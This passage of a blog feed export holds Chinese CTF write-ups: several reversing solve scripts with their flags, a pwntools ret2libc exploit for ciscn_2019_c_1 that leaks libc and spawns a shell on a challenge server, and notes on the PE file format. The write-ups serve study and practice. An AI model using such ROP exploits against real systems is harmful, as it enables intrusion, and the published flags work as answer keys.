class="number">0x05A1</span>, <span class="number">0x0604</span>, <span class="number">0x0635</span>, <span class="number">0x0696</span>,</span><br><span class="line">       <span class="number">0x0704</span>, <span class="number">0x0763</span>, <span class="number">0x07CC</span>, <span class="number">0x0840</span>, <span class="number">0x0875</span>, <span class="number">0x08D4</span>, <span class="number">0x0920</span>, <span class="number">0x096C</span>, <span class="number">0x09C2</span>,</span><br><span class="line">       <span class="number">0x0A0F</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(vec)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(vec[i] - vec[i-<span class="number">1</span>]), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><p>flag{dr4g0n_or_p4tric1an_it5_LLVM}</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CFI-CTF2018_Automated_Reversing</title>
      <link href="/2023/04/18/CFI-CTF2018-Automated-Reversing/"/>
      <url>/2023/04/18/CFI-CTF2018-Automated-Reversing/</url>
      
        <content type="html"><![CDATA[        <h1 id="CFI-CTF-2018-Automated-Reversing"   >          <a href="#CFI-CTF-2018-Automated-Reversing" class="heading-link"><i class="fas fa-link"></i></a><a href="#CFI-CTF-2018-Automated-Reversing" class="headerlink" title="[CFI-CTF 2018]Automated Reversing"></a>[CFI-CTF 2018]Automated Reversing</h1>      <p>打开全是elf文件</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304182102380.png" alt="image-20230418210205327"></p><p>每个文件的格式都是固定的</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304182109025.png" alt="image-20230418210947989"></p><p>仅有中间这里有区别</p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1009</span>):</span><br><span class="line">    path = <span class="string">r&quot;binaries\binary&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    f = <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    buf = f.read()</span><br><span class="line">    flag = buf[<span class="number">0xce</span>]</span><br><span class="line">    operate = buf[<span class="number">0xca</span>]</span><br><span class="line">    num = buf[<span class="number">0xcb</span>]</span><br><span class="line">    <span class="keyword">if</span> operate == <span class="number">0xf2</span>:</span><br><span class="line">        flag ^= num</span><br><span class="line">    <span class="keyword">elif</span> operate == <span class="number">0xea</span>:</span><br><span class="line">        flag += num</span><br><span class="line">    <span class="keyword">elif</span> operate == <span class="number">0xc2</span>:</span><br><span class="line">        flag -= num</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>flag{1s_th1s_4_pr0g_ch4ll_0r_4_r3ve3se_ch4ll?}</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_c_1</title>
      <link href="/2023/04/01/ciscn-2019-c-1/"/>
      <url>/2023/04/01/ciscn-2019-c-1/</url>
      
        <content type="html"><![CDATA[        <h1 id="ciscn-2019-c-1"   >          <a href="#ciscn-2019-c-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1>      <p>环境ubu18</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202304012132714.png" alt="image-20230401213255654"></p><p>gets()函数栈溢出，但是程序没有提供system等函数。考虑构造rop链攻击</p><p>但是这里有个简单的异或对输入进行异或。所以首先输入<code>\0</code>跳过异或</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;/home/mrfifsh/data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">con = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26059</span>)</span><br><span class="line"><span class="comment"># con = process([&#x27;./ciscn_2019_c_1&#x27;])</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>)))</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(con, &#x27;bp 0x00400AED&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pop_rdi_ret_addr))</span><br><span class="line"></span><br><span class="line">//构造第一个rop链泄露puts</span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(pop_rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x4009A0</span>)</span><br><span class="line"></span><br><span class="line">con.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">con.sendlineafter(<span class="string">b&#x27;to be encrypted&#x27;</span>, payload)</span><br><span class="line">con.recvuntil(<span class="string">b&#x27;Ciphertext&#x27;</span>)</span><br><span class="line"></span><br><span class="line">//取得libc基址</span><br><span class="line">libc_rva = u64(con.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_rva))</span><br><span class="line">libc_base = libc_rva - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret_addr = <span class="number">0x400c1c</span></span><br><span class="line"></span><br><span class="line">//要留意栈对齐</span><br><span class="line">payload_1 =<span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(binsh) + p64(system)</span><br><span class="line">con.sendlineafter(<span class="string">b&#x27;to be encrypted&#x27;</span>, payload_1)</span><br><span class="line">con.interactive()</span><br></pre></td></tr></table></div></figure><p>flag{46b67447-14fa-4af3-8fdc-89e6c34be94c}</p><p>当然也可以使用pwntools的ROP工具</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;/home/mrfifsh/data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">con = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26059</span>)</span><br><span class="line"><span class="comment"># con = process([&#x27;./ciscn_2019_c_1&#x27;])</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>)))</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(con, &#x27;bp 0x00400AED&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pop_rdi_ret_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(pop_rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x4009A0</span>)</span><br><span class="line"></span><br><span class="line">con.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">con.sendlineafter(<span class="string">b&#x27;to be encrypted&#x27;</span>, payload)</span><br><span class="line">con.recvuntil(<span class="string">b&#x27;Ciphertext&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_rva = u64(con.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_rva))</span><br><span class="line">libc_base = libc_rva - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret_addr = <span class="number">0x400c1c</span></span><br><span class="line"></span><br><span class="line">libc.address = libc_base</span><br><span class="line">rop = ROP([elf, libc])</span><br><span class="line">rop.call(ret_addr)</span><br><span class="line">rop.call(<span class="string">&#x27;system&#x27;</span>, [binsh])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line"></span><br><span class="line">payload_1 =<span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + rop.chain()</span><br><span class="line">con.sendlineafter(<span class="string">b&#x27;to be encrypted&#x27;</span>, payload_1)</span><br><span class="line">con.interactive()</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> pwnwp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wateverCTF_2019_Repyc</title>
      <link href="/2023/03/23/wateverCTF-2019-Repyc/"/>
      <url>/2023/03/23/wateverCTF-2019-Repyc/</url>
      
        <content type="html"><![CDATA[        <h1 id="watevrCTF-2019-Repyc"   >          <a href="#watevrCTF-2019-Repyc" class="heading-link"><i class="fas fa-link"></i></a><a href="#watevrCTF-2019-Repyc" class="headerlink" title="[watevrCTF 2019]Repyc"></a>[watevrCTF 2019]Repyc</h1>      <p>pyc文件</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303231856670.png" alt="image-20230323185637439"></p><p>单纯的把变量名换成奇奇怪怪的东西</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303231857835.png" alt="image-20230323185731660"></p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜÉïÙãäãÖÓÕÙÛá×äÕà©â«³£ï²ÕÔÈ·±â¨ë&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    x = <span class="built_in">ord</span>(flag[i])</span><br><span class="line">    x = ((x+<span class="number">15</span>) ^ <span class="number">135</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><p>watevr{this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com&#x2F;watch?v&#x3D;E5yFcdPAGv0} </p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019_hardcpp</title>
      <link href="/2023/03/22/SUCTF2019-hardcpp/"/>
      <url>/2023/03/22/SUCTF2019-hardcpp/</url>
      
        <content type="html"><![CDATA[        <h2 id="SUCTF2019-hardcpp"   >          <a href="#SUCTF2019-hardcpp" class="heading-link"><i class="fas fa-link"></i></a><a href="#SUCTF2019-hardcpp" class="headerlink" title="[SUCTF2019]hardcpp"></a>[SUCTF2019]hardcpp</h2>      <p>ollvm混淆，去混淆后</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303221923074.png" alt="image-20230322192248478"></p><p>题目上面给了提示</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303221923782.png" alt="image-20230322192340754"></p><p>这串16进制MD5解密后就是<code>#</code></p><p>写脚本</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">22</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">20</span>] = &#123;</span><br><span class="line">        <span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, </span><br><span class="line">        <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span></span><br><span class="line">    &#125;;</span><br><span class="line">    input[<span class="number">0</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">21</span>; i++) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> x = ((input[i<span class="number">-1</span>] ^ <span class="number">18</span>) * <span class="number">3</span>) + <span class="number">2</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> y = enc[i<span class="number">-1</span>] ^ x;</span><br><span class="line">        y = y - (input[i<span class="number">-1</span>] % <span class="number">7</span>);</span><br><span class="line">        input[i] = y ^ <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">21</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, input[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>flag{mY-CurR1ed_Fns}</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PE文件结构</title>
      <link href="/2023/03/21/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
      <url>/2023/03/21/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[        <h1 id="PE文件结构"   >          <a href="#PE文件结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h1>      <p>PE（Portable Executable）是Windows操作系统下的可执行文件格式</p>        <h2 id="基本结构"   >          <a href="#基本结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2>      <p>PE使用的是一个平面地址空间。</p><p>在文件中使用偏移（offset），而在程序中使用VA（Virtual Address）来表示位置。当文件加载到内存的时候，节区的大小和位置会发生变化。每个节区的大小都是“最小基本单位“的整数倍，剩余的空间用NULL来填充。这样可以加快计算机处理文件，内存，网络包的效率。</p>        <h3 id="PE头"   >          <a href="#PE头" class="heading-link"><i class="fas fa-link"></i></a><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h3>      <p>PE头是从DOS头到节区头的空间，有许多结构体组成。</p>        <h4 id="DOS头"   >          <a href="#DOS头" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h4>      <p>每个PE文件由DOS头开始</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303152301315.png" alt="image-20230315230112225"></p><p>e_magic：DOS签名，0x4D5A &#x3D;&gt;  “MZ”</p><p>e_lfanew：NT头的偏移</p>        <h4 id="NT头"   >          <a href="#NT头" class="heading-link"><i class="fas fa-link"></i></a><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h4>      <p>NT头，IMAGE_NT_HEADERS</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303152305267.png" alt="image-20230315230521226"></p><ul><li>DWORD Signature：50450000h（“PE”，00）</li></ul><p>​#define IMAGE_NT_SIGNATURE 0x00004550</p><ul><li><p>IMAGE_FILE_HEADER FileHerder 映像文件头</p><p>该结构体包含了PE文件的一些基本信息，并指出了IMAGE_OPTIONAL_HEADER的大小</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303152309633.png" alt="image-20230315230919579"></p><ul><li><p>Machine：可执行文件的目标CPU类型</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303152310458.png" alt="image-20230315231007409"></p></li><li><p>NumerPfSections：区块的数目</p></li><li><p>TimeDateStamp：文件创建时间</p></li><li><p>PointerToSymbolTable：COFF符号表的文件偏移</p></li><li><p>NumberOfSymbols：如果由COFF符号表，则显示其中的符号数目</p></li><li><p>SizeOfOptionHeader：表示数据的大小</p></li><li><p>Characteristics：文件属性</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303152315859.png" alt="image-20230315231520779"></p></li></ul></li><li><p>IMAGE_OPTIONAL_HEADER 可选映像头</p><p>32位</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303152317753.png" alt="image-20230315231721704"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303152317286.png" alt="image-20230315231730212"></p><p>64位</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303152318656.png" alt="image-20230315231806571"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303152318143.png" alt="image-20230315231821107"></p><ul><li><p>Magic：标记文件类型</p><p>32位：10B  64位：20B</p></li><li><p>MajorLinkerVersion：</p></li><li><p>MinorLinkerVersion：</p></li><li><p>SizeOfCode：</p></li><li><p>SizeOfUninitializedData：未初始化数据块的大小，通常在.bss段中</p></li><li><p>AddressOfEntryPoint：程序入口RVA。</p></li><li><p>BaseOfCode：代码段的起始RVA。代码段一般在PE头之后，数据块之前，在Microsoft链接器生成的可执行文件中一般为0x1000</p></li><li><p>ImageBase：文件在内存中的首选载入地址。一般来说，EXE和DLL会被加载入用户内存0~7FFFFFFFh中，而SYS文件则会加载入80000000h~FFFFFFFFh的内核内存中</p><p>PEloder装载程序的时候，首先创建进程，将文件载入内存，然后将EIP寄存器设置为ImageBase+AddressOfEntryPoint</p></li><li><p>SectionAlignment：载入内存的区块对齐大小</p></li><li><p>FileAlignment：磁盘上PE文件内的区块对齐大小</p></li><li><p>MajorOperatingSystemVersion：</p></li><li><p>MinorOperartingSystemVersion：</p></li><li><p>MinorImageVersion：</p></li><li><p>MajorImageVersion：</p></li><li><p>MajorSubsystemVersion：</p></li><li><p>MinorSubsystemVersion：</p></li><li><p>Win32VersionValue：</p></li><li><p>SizeOfImage：加载PE文件时，指定PE Image在内存中所占空间的大小</p></li><li><p>SizeOfHeaders：指出整个PE头的大小。该值一定是FileAlignment的整数倍。</p></li><li><p>CheckSum：</p></li><li><p>Subsystem：区分系统驱动文件和普通可执行文件。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303152342589.png" alt="image-20230315234227531"></p></li><li><p>DllCharacteristics：DllMain()函数何时被调用</p></li><li><p>SizeOfStackReserve：在EXE文件里面为线程保留的站的大小</p></li><li><p>SizeOfStackCommit：在EXE文件里面一开始被委派给栈的内存，默认值是4KB</p></li><li><p>SizeOfHeapReserve：为进程的默认堆保留的内存，默认值是1MB</p></li><li><p>SizeOfHeapCommit：在EXE文件里面一开始被委派给堆的内存，默认值是4KB</p></li><li><p>LoaderFlags：与调试相关，默认值为0</p></li><li><p>NumberOfRvaAndSizes：数据目录的项数</p></li><li><p>DataDirectory[16]：数据目录表，由数个相同的IMAGE_DATA_DIRECTORY结构体组成。指向输出表，输入表，资源块等数据。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303161603515.png" alt="image-20230316160303433"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303161603797.png" alt="image-20230316160328679"></p><p>​PE文件依赖该结构体来定位输出表，输入表和资源等重要数据</p></li></ul></li></ul>        <h3 id="区块"   >          <a href="#区块" class="heading-link"><i class="fas fa-link"></i></a><a href="#区块" class="headerlink" title="区块"></a>区块</h3>      <p>在PE文件头和原始数据之间存在区块表（Section Table）</p>        <h4 id="区块表"   >          <a href="#区块表" class="heading-link"><i class="fas fa-link"></i></a><a href="#区块表" class="headerlink" title="区块表"></a>区块表</h4>      <p>区块表紧跟在NT头之后，是一个由IMAGE_SECTION_HEADER组成的结构体数组。每个结构体数组包含了其所关联的区块信息</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303171635466.png" alt="image-20230317163531391"></p><ul><li><p>Name：块名。一般为8位的ASCII名。</p></li><li><p>VirtualSize：指出实际被使用的区块大小。</p></li><li><p>VirtualAddress： 该块装载到内存中的RVA地址。</p></li><li><p>SizeOfRawData：该块在磁盘中所占的空间。这里的数值计算了被FileAlignment调整的大小，因此为磁盘最小分块的整数倍</p></li><li><p>PointToRawData：该块在磁盘文件中的偏移。</p></li><li><p>PointToRelocations：在EXE文件中无意义。在OBJ文件中表示本块重定位信息的偏移量</p></li><li><p>PointToLinenumbers：</p></li><li><p>Characteristics：块属性。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303182226560.png"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303182227698.png" alt="image-20230318222714596"></p></li></ul>        <h4 id="常见区块"   >          <a href="#常见区块" class="heading-link"><i class="fas fa-link"></i></a><a href="#常见区块" class="headerlink" title="常见区块"></a>常见区块</h4>      <p>PE文件一般至少两个区块，代码块与数据块。</p><p>以下是常见区块</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303182232412.png" alt="image-20230318223239272"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303182232421.png" alt="image-20230318223259236"></p>        <h3 id="输入表"   >          <a href="#输入表" class="heading-link"><i class="fas fa-link"></i></a><a href="#输入表" class="headerlink" title="输入表"></a>输入表</h3>      <p>可执行文件使用来自其他DLL的代码或者数据的行为被成为输入。当PE文件被载入的时候，通过Import Table来定位被输入的函数和数据的地址。</p>        <h4 id="输入函数的调用"   >          <a href="#输入函数的调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#输入函数的调用" class="headerlink" title="输入函数的调用"></a>输入函数的调用</h4>      <p>一般来说，被导入的函数在程序中只会保留相关的信息，例如函数名和DLL名，而不会直接储存相关的代码。</p><p>因此在PE文件里面，利用INT（Import Name Table）来记录程序索要调用东方输入函数的名字，利用IAT（Import Address Table）来记录程序所要调用的输入函数的地址。</p>        <h4 id="输入表的结构"   >          <a href="#输入表的结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#输入表的结构" class="headerlink" title="输入表的结构"></a>输入表的结构</h4>      <p>NT头的数据目录第二个成员指向输入表。每个输入表由IID数组开始</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305081608807.png"></p><ul><li>OriginalFirstThunk(CHaracteristics)：包含指向输入名称表（INT）的RVA。</li><li>TimeDataStamp：32位时间戳</li><li>ForwarderChain：</li><li>Name：DLL名字的指针，包含输入的DLL名</li><li>FirstThunk：包含指向输入地址表（IAT）的RVA。</li></ul><p>IAT的装载顺序：</p><ol><li><p>读取IID的Name成员，获取库名字字符串</p></li><li><p>LoadLibrary(“”)</p></li><li><p>读取IID的OriginalFirstThunk成员，获取INT地址。</p></li><li><p>逐一读取INT中的值，获取对应IMAGE_TMPORT_BY_NAME的RVA</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303212145699.png" alt="image-20230321214504809"></p></li><li><p>使用Hint值或者Name获取对应函数的起始地址。</p></li><li><p>读取IID的FirstThunk（IAT）成员，获得IAT地址</p></li><li><p>将获得的函数的地址输入相应的IAT数组值</p></li><li><p>重复4-7直到INT读取完毕</p></li></ol>        <h3 id="输出表"   >          <a href="#输出表" class="heading-link"><i class="fas fa-link"></i></a><a href="#输出表" class="headerlink" title="输出表"></a>输出表</h3>      